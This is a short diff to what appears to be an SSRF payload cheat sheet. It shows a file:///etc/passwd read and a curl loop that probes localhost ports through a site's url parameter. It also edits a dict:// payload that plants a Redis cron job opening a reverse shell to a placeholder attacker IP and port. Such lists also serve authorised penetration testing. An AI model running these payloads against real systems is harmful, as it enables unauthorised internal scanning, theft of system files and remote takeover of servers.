@@ -65,7 +65,8 @@ https://excess-xss.com/
 file://index.php
 file:///etc/passwd
 
-dict://127.0.0.1:6379/set -.- "\n\n\n* * * * * bash -i >\x26 /dev/tcp/"ip"/"port" 0>\x261\n\n\n"
+for i in {1..10000}; do curl -s -i http://site.org/index.php --data "url=http://localhost:$i" | grep 'Content-Length'| xargs echo "$i:"; done
+dict://127.0.0.1:6379/set -.- "\n\n\n* * * * * bash -i >\x26 /dev/tcp/<ip>/<port> 0>\x261\n\n\n"
 ```
 
 ## Bypass filters
